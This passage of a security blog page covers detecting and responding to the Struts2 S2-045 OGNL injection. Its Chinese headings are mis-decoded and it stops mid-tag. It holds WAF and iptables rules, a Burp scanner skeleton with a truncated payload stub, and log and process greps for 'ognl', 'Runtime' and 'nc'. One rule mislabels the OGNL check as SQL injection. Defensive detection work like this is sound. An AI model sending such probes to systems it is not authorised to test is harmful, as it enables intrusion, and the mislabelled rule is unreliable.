&lt;h4 id=&#34;2-WAFè§„åˆ™é…ç½®&#34;&gt;&lt;a href=&#34;#2-WAFè§„åˆ™é…ç½®&#34; class=&#34;headerlink&#34; title=&#34;2. WAFè§„åˆ™é…ç½®&#34;&gt;&lt;/a&gt;2. WAFè§„åˆ™é…ç½®&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;ModSecurityè§„åˆ™&lt;/strong&gt;:&lt;/p&gt;
&lt;figure class=&#34;highlight 1c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs 1c&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# æ£€æµ‹S2-045æ”»å‡»ç‰¹å¾&lt;/span&gt;&lt;br&gt;SecRule REQUEST_HEADERS&lt;span class=&#34;hljs-punctuation&#34;&gt;:&lt;/span&gt;Content&lt;span class=&#34;hljs-punctuation&#34;&gt;-&lt;/span&gt;Type &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;@detectSQLi&amp;quot;&lt;/span&gt; \&lt;br&gt;    &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;id:1001,\&lt;/span&gt;&lt;br&gt;    phase&lt;span class=&#34;hljs-punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;,&lt;/span&gt;\&lt;br&gt;    block&lt;span class=&#34;hljs-punctuation&#34;&gt;,&lt;/span&gt;\&lt;br&gt;    msg&lt;span class=&#34;hljs-punctuation&#34;&gt;:&lt;/span&gt;&amp;#x27;Struts2 S2-045 Attack Detected&amp;#x27;&lt;span class=&#34;hljs-punctuation&#34;&gt;,&lt;/span&gt;\&lt;br&gt;    logdata&lt;span class=&#34;hljs-punctuation&#34;&gt;:&lt;/span&gt;&amp;#x27;Content-Type: %&amp;#123;MATCHED_VAR&amp;#125;&amp;#x27;&lt;span class=&#34;hljs-punctuation&#34;&gt;,&lt;/span&gt;\&lt;br&gt;    tag&lt;span class=&#34;hljs-punctuation&#34;&gt;:&lt;/span&gt;&amp;#x27;attack-sqli&amp;#x27;&lt;span class=&#34;hljs-punctuation&#34;&gt;,&lt;/span&gt;\&lt;br&gt;    tag&lt;span class=&#34;hljs-punctuation&#34;&gt;:&lt;/span&gt;&amp;#x27;OWASP_CRS/WEB_ATTACK/SQL_INJECTION&amp;#x27;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# æ£€æµ‹OGNLè¡¨è¾¾å¼&lt;/span&gt;&lt;br&gt;SecRule REQUEST_HEADERS&lt;span class=&#34;hljs-punctuation&#34;&gt;:&lt;/span&gt;Content&lt;span class=&#34;hljs-punctuation&#34;&gt;-&lt;/span&gt;Type &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;@contains %&amp;#123;&amp;quot;&lt;/span&gt; \&lt;br&gt;    &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;id:1002,\&lt;/span&gt;&lt;br&gt;    phase&lt;span class=&#34;hljs-punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;,&lt;/span&gt;\&lt;br&gt;    block&lt;span class=&#34;hljs-punctuation&#34;&gt;,&lt;/span&gt;\&lt;br&gt;    msg&lt;span class=&#34;hljs-punctuation&#34;&gt;:&lt;/span&gt;&amp;#x27;Potential OGNL Injection in Content-Type&amp;#x27;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h4 id=&#34;3-ç½‘ç»œå±‚é˜²æŠ¤&#34;&gt;&lt;a href=&#34;#3-ç½‘ç»œå±‚é˜²æŠ¤&#34; class=&#34;headerlink&#34; title=&#34;3. ç½‘ç»œå±‚é˜²æŠ¤&#34;&gt;&lt;/a&gt;3. ç½‘ç»œå±‚é˜²æŠ¤&lt;/h4&gt;&lt;figure class=&#34;highlight css&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs css&#34;&gt;# iptablesè§„åˆ™ç¤ºä¾‹&lt;br&gt;iptables -&lt;span class=&#34;hljs-selector-tag&#34;&gt;A&lt;/span&gt; &lt;span class=&#34;hljs-selector-tag&#34;&gt;INPUT&lt;/span&gt; -&lt;span class=&#34;hljs-selector-tag&#34;&gt;p&lt;/span&gt; tcp &lt;span class=&#34;hljs-attr&#34;&gt;--dport&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;8080&lt;/span&gt; -m string &lt;span class=&#34;hljs-attr&#34;&gt;--string&lt;/span&gt; &amp;quot;%&amp;#123;&amp;quot; &lt;span class=&#34;hljs-attr&#34;&gt;--algo&lt;/span&gt; bm -j DROP&lt;br&gt;iptables -&lt;span class=&#34;hljs-selector-tag&#34;&gt;A&lt;/span&gt; &lt;span class=&#34;hljs-selector-tag&#34;&gt;INPUT&lt;/span&gt; -&lt;span class=&#34;hljs-selector-tag&#34;&gt;p&lt;/span&gt; tcp &lt;span class=&#34;hljs-attr&#34;&gt;--dport&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;8080&lt;/span&gt; -m string &lt;span class=&#34;hljs-attr&#34;&gt;--string&lt;/span&gt; &amp;quot;ognl&amp;quot; &lt;span class=&#34;hljs-attr&#34;&gt;--algo&lt;/span&gt; bm -j DROP&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h4 id=&#34;4-åº”ç”¨å±‚åŠ å›º&#34;&gt;&lt;a href=&#34;#4-åº”ç”¨å±‚åŠ å›º&#34; class=&#34;headerlink&#34; title=&#34;4. åº”ç”¨å±‚åŠ å›º&#34;&gt;&lt;/a&gt;4. åº”ç”¨å±‚åŠ å›º&lt;/h4&gt;&lt;figure class=&#34;highlight scala&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs scala&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// è‡ªå®šä¹‰æ‹¦æˆªå™¨&lt;/span&gt;&lt;br&gt;public &lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;SecurityInterceptor&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;AbstractInterceptor&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-meta&#34;&gt;@Override&lt;/span&gt;&lt;br&gt;    public &lt;span class=&#34;hljs-type&#34;&gt;String&lt;/span&gt; intercept(&lt;span class=&#34;hljs-type&#34;&gt;ActionInvocation&lt;/span&gt; invocation) &lt;span class=&#34;hljs-keyword&#34;&gt;throws&lt;/span&gt; &lt;span class=&#34;hljs-type&#34;&gt;Exception&lt;/span&gt; &amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-type&#34;&gt;HttpServletRequest&lt;/span&gt; request = &lt;span class=&#34;hljs-type&#34;&gt;ServletActionContext&lt;/span&gt;.getRequest();&lt;br&gt;        &lt;span class=&#34;hljs-type&#34;&gt;String&lt;/span&gt; contentType = request.getContentType();&lt;br&gt;        &lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (contentType != &lt;span class=&#34;hljs-literal&#34;&gt;null&lt;/span&gt; &amp;amp;&amp;amp; contentType.contains(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;%&amp;#123;&amp;quot;&lt;/span&gt;)) &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-type&#34;&gt;SecurityException&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Malicious Content-Type detected&amp;quot;&lt;/span&gt;);&lt;br&gt;        &amp;#125;&lt;br&gt;        &lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; invocation.invoke();&lt;br&gt;    &amp;#125;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&#34;å®æˆ˜æŠ€å·§ä¸å·¥å…·&#34;&gt;&lt;a href=&#34;#å®æˆ˜æŠ€å·§ä¸å·¥å…·&#34; class=&#34;headerlink&#34; title=&#34;å®æˆ˜æŠ€å·§ä¸å·¥å…·&#34;&gt;&lt;/a&gt;å®æˆ˜æŠ€å·§ä¸å·¥å…·&lt;/h2&gt;&lt;h3 id=&#34;BurpSuiteæ’ä»¶å¼€å‘&#34;&gt;&lt;a href=&#34;#BurpSuiteæ’ä»¶å¼€å‘&#34; class=&#34;headerlink&#34; title=&#34;BurpSuiteæ’ä»¶å¼€å‘&#34;&gt;&lt;/a&gt;BurpSuiteæ’ä»¶å¼€å‘&lt;/h3&gt;&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs java&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// S2-045æ£€æµ‹æ’ä»¶æ¡†æ¶&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title class_&#34;&gt;S2045Scanner&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;implements&lt;/span&gt; &lt;span class=&#34;hljs-title class_&#34;&gt;IScannerCheck&lt;/span&gt; &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-meta&#34;&gt;@Override&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; List&amp;lt;IScanIssue&amp;gt; &lt;span class=&#34;hljs-title function_&#34;&gt;doActiveScan&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint)&lt;/span&gt; &amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-comment&#34;&gt;// æ„é€ S2-045 payload&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-type&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;hljs-operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;%&amp;#123;(#nike=&amp;#x27;multipart/form-data&amp;#x27;)...&amp;#125;&amp;quot;&lt;/span&gt;;&lt;br&gt;        &lt;br&gt;        &lt;span class=&#34;hljs-comment&#34;&gt;// å‘é€æµ‹è¯•è¯·æ±‚&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-type&#34;&gt;byte&lt;/span&gt;[] checkRequest = insertionPoint.buildRequest(payload.getBytes());&lt;br&gt;        &lt;span class=&#34;hljs-type&#34;&gt;IHttpRequestResponse&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;checkRequestResponse&lt;/span&gt; &lt;span class=&#34;hljs-operator&#34;&gt;=&lt;/span&gt; callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), checkRequest);&lt;br&gt;        &lt;br&gt;        &lt;span class=&#34;hljs-comment&#34;&gt;// åˆ†æå“åº”åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ¼æ´&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (isVulnerable(checkRequestResponse)) &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; Collections.singletonList(&lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-title class_&#34;&gt;CustomScanIssue&lt;/span&gt;(&lt;span class=&#34;hljs-comment&#34;&gt;/* ... */&lt;/span&gt;));&lt;br&gt;        &amp;#125;&lt;br&gt;        &lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;null&lt;/span&gt;;&lt;br&gt;    &amp;#125;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;æ‰¹é‡æ£€æµ‹è„šæœ¬&#34;&gt;&lt;a href=&#34;#æ‰¹é‡æ£€æµ‹è„šæœ¬&#34; class=&#34;headerlink&#34; title=&#34;æ‰¹é‡æ£€æµ‹è„šæœ¬&#34;&gt;&lt;/a&gt;æ‰¹é‡æ£€æµ‹è„šæœ¬&lt;/h3&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#!/bin/bash&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# S2-045æ‰¹é‡æ£€æµ‹è„šæœ¬&lt;/span&gt;&lt;br&gt;&lt;br&gt;targets=(&lt;br&gt;    &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;http://target1.com:8080&amp;quot;&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;http://target2.com:8080&amp;quot;&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;http://target3.com:8080&amp;quot;&lt;/span&gt;&lt;br&gt;)&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; target &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;span class=&#34;hljs-variable&#34;&gt;$&amp;#123;targets[@]&amp;#125;&lt;/span&gt;&amp;quot;&lt;/span&gt;; &lt;span class=&#34;hljs-keyword&#34;&gt;do&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-built_in&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Testing: &lt;span class=&#34;hljs-variable&#34;&gt;$target&lt;/span&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;    python3 s2-045-check.py &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;span class=&#34;hljs-variable&#34;&gt;$target&lt;/span&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-built_in&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;---&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;done&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&#34;åº”æ€¥å“åº”æŒ‡å—&#34;&gt;&lt;a href=&#34;#åº”æ€¥å“åº”æŒ‡å—&#34; class=&#34;headerlink&#34; title=&#34;åº”æ€¥å“åº”æŒ‡å—&#34;&gt;&lt;/a&gt;åº”æ€¥å“åº”æŒ‡å—&lt;/h2&gt;&lt;h3 id=&#34;1-æ¼æ´ç¡®è®¤&#34;&gt;&lt;a href=&#34;#1-æ¼æ´ç¡®è®¤&#34; class=&#34;headerlink&#34; title=&#34;1. æ¼æ´ç¡®è®¤&#34;&gt;&lt;/a&gt;1. æ¼æ´ç¡®è®¤&lt;/h3&gt;&lt;figure class=&#34;highlight gradle&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs gradle&#34;&gt;# æ£€æŸ¥Struts2ç‰ˆæœ¬&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;find&lt;/span&gt; &lt;span class=&#34;hljs-regexp&#34;&gt;/ -name &amp;quot;struts2-core-*.jar&amp;quot; 2&amp;gt;/&lt;/span&gt;dev/&lt;span class=&#34;hljs-keyword&#34;&gt;null&lt;/span&gt;&lt;br&gt;&lt;br&gt;# æ£€æŸ¥è®¿é—®æ—¥å¿—ä¸­çš„æ”»å‡»ç‰¹å¾&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;grep&lt;/span&gt; -E &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Content-Type.*%\&amp;#123;&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-regexp&#34;&gt;/var/&lt;/span&gt;log&lt;span class=&#34;hljs-regexp&#34;&gt;/apache2/&lt;/span&gt;access.log&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;grep&lt;/span&gt; -E &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;ognl|ProcessBuilder|Runtime&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-regexp&#34;&gt;/var/&lt;/span&gt;log&lt;span class=&#34;hljs-regexp&#34;&gt;/tomcat/&lt;/span&gt;catalina.out&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;2-åº”æ€¥å¤„ç½®&#34;&gt;&lt;a href=&#34;#2-åº”æ€¥å¤„ç½®&#34; class=&#34;headerlink&#34; title=&#34;2. åº”æ€¥å¤„ç½®&#34;&gt;&lt;/a&gt;2. åº”æ€¥å¤„ç½®&lt;/h3&gt;&lt;figure class=&#34;highlight sas&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs sas&#34;&gt;# ä¸´æ—¶é˜»æ–­æ”»å‡»IP&lt;br&gt;iptables -A &lt;span class=&#34;hljs-keyword&#34;&gt;INPUT&lt;/span&gt; -s &amp;lt;æ”»å‡»IP&amp;gt; -j &lt;span class=&#34;hljs-keyword&#34;&gt;DROP&lt;/span&gt;&lt;br&gt;&lt;br&gt;# åœæ­¢ç›¸å…³æœåŠ¡&lt;br&gt;systemctl &lt;span class=&#34;hljs-keyword&#34;&gt;stop&lt;/span&gt; tomcat&lt;br&gt;systemctl &lt;span class=&#34;hljs-keyword&#34;&gt;stop&lt;/span&gt; apache2&lt;br&gt;&lt;br&gt;# å¤‡ä»½ç³»ç»ŸçŠ¶æ€&lt;br&gt;tar -czf /tmp/system_backup_$(date +&lt;span class=&#34;hljs-title function_&#34;&gt;%Y&lt;/span&gt;&lt;span class=&#34;hljs-title function_&#34;&gt;%m&lt;/span&gt;&lt;span class=&#34;hljs-title function_&#34;&gt;%d_&lt;/span&gt;&lt;span class=&#34;hljs-title function_&#34;&gt;%H&lt;/span&gt;&lt;span class=&#34;hljs-title function_&#34;&gt;%M&lt;/span&gt;&lt;span class=&#34;hljs-title function_&#34;&gt;%S&lt;/span&gt;).tar.gz /var/log /etc /opt/tomcat&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;3-ç—•è¿¹æ¸…ç†æ£€æŸ¥&#34;&gt;&lt;a href=&#34;#3-ç—•è¿¹æ¸…ç†æ£€æŸ¥&#34; class=&#34;headerlink&#34; title=&#34;3. ç—•è¿¹æ¸…ç†æ£€æŸ¥&#34;&gt;&lt;/a&gt;3. ç—•è¿¹æ¸…ç†æ£€æŸ¥&lt;/h3&gt;&lt;figure class=&#34;highlight vim&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs vim&#34;&gt;# æ£€æŸ¥æ˜¯å¦æœ‰å¼‚å¸¸è¿›ç¨‹&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;ps&lt;/span&gt; aux | &lt;span class=&#34;hljs-keyword&#34;&gt;grep&lt;/span&gt; -E &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;nc|bash|sh|python|perl&amp;quot;&lt;/span&gt; | &lt;span class=&#34;hljs-keyword&#34;&gt;grep&lt;/span&gt; -v &lt;span class=&#34;hljs-keyword&#34;&gt;grep&lt;/span&gt;&lt;br&gt;&lt;br&gt;# æ£€æŸ¥ç½‘ç»œè¿æ¥&lt;br&gt;netstat -antlp | &lt;span class=&#34;hljs-keyword&#34;&gt;grep&lt;/span&gt; ESTABLISHED&lt;br&gt;&lt;br&gt;# æ£€æŸ¥æ–°å¢æ–‡ä»¶&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;find&lt;/span&gt; /tmp /var/tmp -&lt;span class=&#34;hljs-built_in&#34;&gt;type&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;f&lt;/span&gt; -mtime -&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span 